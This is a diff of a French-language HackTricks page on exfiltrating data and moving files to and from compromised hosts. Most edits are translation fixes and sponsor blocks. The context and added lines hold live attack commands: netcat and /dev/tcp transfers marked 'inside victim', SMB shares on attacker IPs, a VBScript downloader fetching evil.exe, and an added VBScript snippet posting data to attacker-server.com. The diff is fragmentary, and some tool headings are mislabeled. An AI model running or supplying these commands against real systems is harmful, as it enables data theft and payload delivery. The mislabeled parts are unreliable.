@@ -6,13 +6,21 @@
 
 Autres façons de soutenir HackTricks :
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Si vous voulez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+
+**Groupe de sécurité Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
 
 ## Domaines couramment autorisés pour exfiltrer des informations
 
@@ -57,7 +65,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Téléverser des fichiers
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer affiche les GET et POST (également les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Module Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -183,26 +191,47 @@ service smbd restart
 
 ### Exfiltration Over Command and Control Channel
 
-- **Description:** Exfiltrating data over the command and control channel established by the attacker.
-- **Detection:** Monitor network traffic for unusual patterns or data leaving the network.
-- **Prevention:** Implement network segmentation and access controls to limit communication channels.
+When an attacker has compromised a system, they may exfiltrate data over the command and control (C2) channel. This can be done by executing commands on the compromised system to transfer data to the attacker's server.
 
-### Exfiltration Over Alternative Protocol
+### Exfiltration Over Alternative Protocols
 
-- **Description:** Exfiltrating data using protocols not commonly monitored by security tools.
-- **Detection:** Use deep packet inspection to analyze network traffic for suspicious activities.
-- **Prevention:** Employ encryption and tunneling to obfuscate exfiltrated data.
+Attackers may exfiltrate data using alternative protocols such as DNS, ICMP, or HTTPS to bypass network security controls that only monitor traditional protocols like HTTP.
 
-### Exfiltration Over Unencrypted Protocols
+### Exfiltration Over Encrypted Channels
 
-- **Description:** Sending data over unencrypted protocols such as HTTP or FTP.
-- **Detection:** Monitor network traffic for plaintext data being transmitted.
-- **Prevention:** Enforce the use of encrypted communication protocols to protect data in transit.
+To avoid detection, attackers may exfiltrate data over encrypted channels such as SSL/TLS to make it harder for security tools to inspect the data being transferred.
 
 ## Tools
 
-- **[Tool Name]:** Description of the tool and how it can be used for data exfiltration.
-- **[Tool Name]:** Description of the tool and how it can be used for data exfiltration.
+### Data Exfiltration Tools
+
+- **Netcat**: A versatile networking utility that can be used for data transfer.
+- **Wget**: A command-line utility for downloading files from the web, which can also be used for exfiltration.
+- **Curl**: Another command-line tool for transferring data with support for various protocols.
+
+### C2 Frameworks
+
+- **Metasploit**: A popular framework for developing and executing exploit code against a remote target machine.
+- **Cobalt Strike**: A commercial, full-featured, penetration testing tool that includes a robust C2 framework.
+
+### Traffic Obfuscation Tools
+
+- **Mimikatz**: A post-exploitation tool that can be used to extract plaintext passwords, hash, PIN code, and kerberos tickets from memory.
+- **PsExec**: A command-line tool that enables the execution of processes on remote systems.
+
+## Detection
+
+### Network Monitoring
+
+- Monitor network traffic for any unusual patterns or spikes in data transfer volume.
+- Look for connections to known malicious IP addresses or domains.
+- Analyze DNS requests for unusual domain names or long subdomains that could be used for data exfiltration.
+
+### Endpoint Monitoring
+
+- Monitor system logs for suspicious activities such as large file transfers or unusual process executions.
+- Look for signs of data encryption or obfuscation techniques being used by attackers.
+- Implement file integrity monitoring to detect unauthorized changes to sensitive files.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -236,7 +265,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Télécharger un fichier sur la victime
+### Téléverser un fichier à la victime
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -265,7 +294,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un SMTP pour recevoir les données avec python:
+Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un serveur SMTP pour recevoir les données avec python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -299,7 +328,17 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 
 ### Exfiltration
 
-VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method, headers, and body, and then sending the request to the server. The server-side script can receive the data and store it in a file or database for later retrieval by the attacker. This technique can be used to exfiltrate sensitive information such as passwords, documents, or system configuration files.
+VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method and target URL, and sending the data in the request body. The following code snippet demonstrates how data can be exfiltrated using VBScript:
+
+```vbscript
+Dim objHTTP
+Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+objHTTP.Open "POST", "http://attacker-server.com/data", False
+objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+objHTTP.send "data=exfiltrated_data"
+```
+
+In this example, the VBScript code creates an HTTP POST request to "http://attacker-server.com/data" with the exfiltrated data in the request body. The attacker can then receive and process the exfiltrated data on their server.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -337,30 +376,36 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Le programme `debug.exe` non seulement permet l'inspection des binaires, mais a également la **capacité de les reconstruire à partir de l'hexadécimal**. Cela signifie qu'en fournissant un hexadécimal d'un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limite d'assemblage de fichiers jusqu'à 64 ko en taille**.
+Le programme `debug.exe` permet non seulement l'inspection des binaires, mais a également la **capacité de les reconstruire à partir de l'hexadécimal**. Cela signifie qu'en fournissant un hexadécimal d'un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limite d'assemblage de fichiers jusqu'à 64 ko en taille**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-## DNS
-
-* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
-
 Ensuite, copiez-collez le texte dans le shell Windows et un fichier appelé nc.exe sera créé.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
+## DNS
+
+* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
+
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
